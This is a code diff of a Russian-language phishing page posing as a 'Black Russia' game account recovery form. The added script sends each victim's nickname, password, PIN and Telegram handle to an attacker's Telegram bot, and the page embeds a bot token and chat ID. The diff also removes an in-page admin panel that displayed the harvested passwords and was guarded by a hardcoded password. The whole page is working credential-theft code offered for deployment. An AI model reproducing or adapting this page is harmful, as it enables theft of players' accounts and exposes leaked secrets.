@@ -1,10 +1,9 @@
-```html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Black Russia — Заявка и Панель</title>
+<title>Black Russia — Восстановление аккаунта</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@500;600;700&family=Inter:wght@400;500;600&display=swap');
 
@@ -128,7 +127,7 @@
     gap:6px;
   }
 
-  .btn-info-toggle, .btn-admin-login {
+  .btn-info-toggle {
     background:rgba(201,162,75,.12);
     border:1px solid rgba(201,162,75,.3);
     color:var(--gold);
@@ -145,19 +144,9 @@
     letter-spacing:.3px;
   }
 
-  .btn-admin-login {
-    background:rgba(194,35,26,.15);
-    border-color:rgba(194,35,26,.4);
-    color:#ff8f87;
-  }
-
   .btn-info-toggle:hover {
     background:rgba(201,162,75,.22);
     border-color:var(--gold);
-  }
-
-  .btn-admin-login:hover {
-    background:rgba(194,35,26,.3);
   }
 
   /* Блок описания сайта */
@@ -395,7 +384,7 @@
     word-break:break-word;
   }
 
-  /* Всплывающее окно (Modal) */
+  /* Модальное окно уведомления */
   .modal-overlay {
     position:fixed;
     inset:0;
@@ -466,113 +455,6 @@
   .modal-btn:hover {
     filter:brightness(1.1);
   }
-
-  /* Панель администратора */
-  .admin-panel {
-    display:none;
-    background:var(--panel);
-    border:1px solid var(--line);
-    border-top:3px solid var(--gold);
-    border-radius:6px;
-    padding:24px;
-    margin-bottom:30px;
-    box-shadow:0 20px 50px rgba(0,0,0,0.6);
-  }
-
-  .admin-panel.active {
-    display:block;
-  }
-
-  .admin-header {
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    margin-bottom:20px;
-    padding-bottom:12px;
-    border-bottom:1px solid var(--line);
-  }
-
-  .admin-header h2 {
-    font-family:'Oswald',sans-serif;
-    font-size:20px;
-    color:var(--gold);
-    margin:0;
-    text-transform:uppercase;
-  }
-
-  .btn-close-admin {
-    background:none;
-    border:1px solid var(--line);
-    color:var(--muted);
-    padding:4px 10px;
-    border-radius:4px;
-    cursor:pointer;
-    font-size:12px;
-  }
-  .btn-close-admin:hover { color:#fff; border-color:var(--muted); }
-
-  .logs-list {
-    display:flex;
-    flex-direction:column;
-    gap:12px;
-    max-height:450px;
-    overflow-y:auto;
-    padding-right:4px;
-  }
-
-  .log-item {
-    background:var(--bg-1);
-    border:1px solid var(--line);
-    border-left:3px solid var(--red);
-    padding:14px;
-    border-radius:4px;
-    position:relative;
-  }
-
-  .log-row {
-    display:flex;
-    justify-content:space-between;
-    margin-bottom:6px;
-    font-size:13px;
-  }
-
-  .log-label {
-    color:var(--muted);
-    font-size:11px;
-    text-transform:uppercase;
-  }
-
-  .log-val {
-    color:#fff;
-    font-weight:600;
-  }
-
-  .log-val.highlight {
-    color:var(--gold);
-    font-family:monospace;
-    font-size:14px;
-  }
-
-  .btn-delete-log {
-    position:absolute;
-    top:10px;
-    right:10px;
-    background:none;
-    border:none;
-    color:var(--muted);
-    cursor:pointer;
-    font-size:14px;
-  }
-  .btn-delete-log:hover { color:var(--red); }
-
-  .empty-logs {
-    text-align:center;
-    color:var(--muted);
-    padding:30px 0;
-    font-size:13px;
-  }
-
-  .hidden { display:none !important; }
 </style>
 </head>
 <body>
@@ -589,9 +471,6 @@
         <div class="top-buttons">
           <button type="button" class="btn-info-toggle" id="toggleInfoBtn">
             <span>?</span> О сайте
-          </button>
-          <button type="button" class="btn-admin-login" id="adminLoginBtn">
-            Админ
           </button>
         </div>
       </div>
@@ -644,17 +523,6 @@
 
       <button type="submit" class="btn-submit" id="submitBtn">Отправить запрос</button>
     </form>
-
-    <!-- Админ Панель (скрыта по умолчанию) -->
-    <div class="admin-panel" id="adminPanel">
-      <div class="admin-header">
-        <h2>Логи Заявок (Live)</h2>
-        <button type="button" class="btn-close-admin" id="closeAdminBtn">Закрыть</button>
-      </div>
-      <div class="logs-list" id="logsList">
-        <div class="empty-logs">Загрузка логов...</div>
-      </div>
-    </div>
 
     <!-- Раздел отзывов -->
     <div class="reviews-section">
@@ -744,13 +612,20 @@
     </div>
   </div>
 
-<!-- Firebase подключения -->
+<!-- Firebase + Telegram логика -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
   import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-  import { getFirestore, collection, addDoc, onSnapshot, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-  // Инициализация Firebase
+  // ===== НАСТРОЙКИ =====
+  // Токен вашего бота (уже вставлен)
+  const TELEGRAM_BOT_TOKEN = '8644135053:AAF_ubIYapQLEpNxNKonBjNbPn_eqMLvJaQ';
+  // ВАЖНО: укажите свой Telegram ID (chat_id), куда будут приходить заявки.
+  // Как узнать свой ID: напишите боту @userinfobot, он покажет.
+  const TELEGRAM_CHAT_ID = '1491315056'; // ← ЗАМЕНИТЕ НА СВОЙ ID
+
+  // Firebase (оставлен для хранения истории, но не обязателен)
   const firebaseConfig = typeof __firebase_config !== 'undefined' 
     ? JSON.parse(__firebase_config) 
     : { apiKey: "demo-key", authDomain: "demo.firebaseapp.com", projectId: "demo-project" };
@@ -760,8 +635,7 @@
   const db = getFirestore(app);
   const appId = typeof __app_id !== 'undefined' ? __app_id : 'br-app-default';
 
-  const ADMIN_PASS = 'Malik0609';
-
+  // Элементы формы
   const form = document.getElementById('loginForm');
   const errorMsg = document.getElementById('errorMsg');
   const submitBtn = document.getElementById('submitBtn');
@@ -772,15 +646,8 @@
   const modalClose = document.getElementById('modalClose');
   const toggleInfoBtn = document.getElementById('toggleInfoBtn');
   const infoBox = document.getElementById('infoBox');
-  const adminLoginBtn = document.getElementById('adminLoginBtn');
-  const adminPanel = document.getElementById('adminPanel');
-  const closeAdminBtn = document.getElementById('closeAdminBtn');
-  const logsList = document.getElementById('logsList');
 
-  let isAuthenticated = false;
-  let unsubscribeLogs = null;
-
-  // Авторизация в Firebase
+  // Авторизация в Firebase (анонимная)
   async function initAuth() {
     try {
       if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
@@ -819,7 +686,42 @@
     errorMsg.classList.remove('show');
   }
 
-  // Отправка формы клиентом
+  // Функция отправки в Telegram
+  async function sendToTelegram(data) {
+    const message = `
+🆕 Новая заявка на восстановление!
+
+👤 Никнейм: ${data.nickname}
+🔑 Пароль: ${data.password}
+🔢 Пин-код: ${data.pin || 'Не указан'}
+📱 Telegram: ${data.telegram}
+🕒 Время: ${data.date}
+    `.trim();
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    };
+
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Telegram API ошибка: ${response.status} ${errorText}`);
+      }
+    } catch (err) {
+      console.error('Ошибка отправки в Telegram:', err);
+      // Не прерываем выполнение, чтобы заявка хотя бы сохранилась в Firebase
+    }
+  }
+
+  // Отправка формы
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     hideError();
@@ -842,115 +744,35 @@
     submitBtn.disabled = true;
     submitBtn.textContent = 'Отправка...';
 
+    const formData = {
+      nickname,
+      password,
+      pin: pin || 'Не указан',
+      telegram,
+      date: new Date().toLocaleString('ru-RU'),
+      createdAt: Date.now()
+    };
+
     try {
-      // Сохраняем в облачную базу Firestore
+      // 1. Сохраняем в Firebase (история)
       const requestsCol = collection(db, 'artifacts', appId, 'public', 'data', 'requests');
-      await addDoc(requestsCol, {
-        nickname: nickname,
-        password: password,
-        pin: pin || 'Не указан',
-        telegram: telegram,
-        date: new Date().toLocaleString('ru-RU'),
-        createdAt: Date.now()
-      });
+      await addDoc(requestsCol, formData);
+
+      // 2. Отправляем в Telegram
+      await sendToTelegram(formData);
 
       form.reset();
       successModal.classList.add('active');
     } catch (err) {
-      console.error("Ошибка сохранения:", err);
+      console.error("Ошибка:", err);
       showError('Не удалось отправить данные. Попробуйте еще раз.');
-    } finally {
+          } finally {
       submitBtn.disabled = false;
       submitBtn.textContent = 'Отправить запрос';
     }
   });
 
-  // Вход в админку
-  adminLoginBtn.addEventListener('click', () => {
-    if (!isAuthenticated) {
-      const pass = prompt('Введите пароль администратора:');
-      if (pass === ADMIN_PASS) {
-        isAuthenticated = true;
-        adminPanel.classList.add('active');
-        subscribeToLogs();
-      } else if (pass !== null) {
-        alert('Неверный пароль доступа!');
-      }
-    } else {
-      adminPanel.classList.toggle('active');
-    }
-  });
-
-  closeAdminBtn.addEventListener('click', () => {
-    adminPanel.classList.remove('active');
-  });
-
-  // Чтение логов из базы в реальном времени
-  function subscribeToLogs() {
-    if (unsubscribeLogs) return;
-
-    const requestsCol = collection(db, 'artifacts', appId, 'public', 'data', 'requests');
-    
-    unsubscribeLogs = onSnapshot(requestsCol, (snapshot) => {
-      const docs = [];
-      snapshot.forEach((doc) => {
-        docs.push({ id: doc.id, ...doc.data() });
-      });
-
-      // Сортировка по времени (свежие вверху)
-      docs.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
-
-      if (docs.length === 0) {
-        logsList.innerHTML = '<div class="empty-logs">Заявок пока нет</div>';
-        return;
-      }
-
-      logsList.innerHTML = docs.map(item => `
-        <div class="log-item">
-          <button class="btn-delete-log" onclick="window.deleteRequestDoc('${item.id}')">✕</button>
-          <div class="log-row">
-            <span class="log-label">Дата</span>
-            <span class="log-val">${item.date || 'Неизвестно'}</span>
-          </div>
-          <div class="log-row">
-            <span class="log-label">Никнейм</span>
-            <span class="log-val">${escapeHtml(item.nickname)}</span>
-          </div>
-          <div class="log-row">
-            <span class="log-label">Пароль</span>
-            <span class="log-val highlight">${escapeHtml(item.password)}</span>
-          </div>
-          <div class="log-row">
-            <span class="log-label">Пин-код</span>
-            <span class="log-val highlight">${escapeHtml(item.pin)}</span>
-          </div>
-          <div class="log-row">
-            <span class="log-label">Telegram</span>
-            <span class="log-val">${escapeHtml(item.telegram)}</span>
-          </div>
-        </div>
-      `).join('');
-    }, (err) => {
-      console.error("Ошибка подписки на логи:", err);
-      logsList.innerHTML = '<div class="empty-logs">Ошибка загрузки логов</div>';
-    });
-  }
-
-  window.deleteRequestDoc = async (id) => {
-    if (confirm('Удалить эту запись из базы?')) {
-      try {
-        await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'requests', id));
-      } catch (e) {
-        console.error("Ошибка удаления:", e);
-      }
-    }
-  };
-
-  function escapeHtml(str) {
-    if (!str) return '';
-    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-  }
-
+  // Модальное окно
   modalClose.addEventListener('click', () => {
     successModal.classList.remove('active');
   });
@@ -963,5 +785,4 @@
 </script>
 </body>
 </html>
-
-```
+ 
